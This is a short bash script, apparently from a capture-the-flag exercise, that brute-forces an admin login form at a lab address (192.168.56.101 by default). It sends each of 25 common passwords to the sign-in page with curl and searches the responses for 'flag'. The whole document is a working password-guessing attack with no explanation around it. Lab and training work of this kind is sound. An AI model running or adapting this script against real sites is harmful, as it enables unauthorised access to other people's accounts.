#!/bin/bash

password=(123456 password 12345678 qwerty abc123 123456789 111111 1234567 iloveyou adobe123 123123 Admin 1234567890 letmein photoshop 1234 monkey shadow sunshine 12345 password1 princess azerty trustno1 000000)
ip="192.168.56.101" && [[ "$1" ]]  && ip="$1"

for i in ${password[@]}; do
	curl -X POST "http://${ip}/index.php?page=signin&username=admin&password=${i}&Login=Login#" | grep 'flag'
done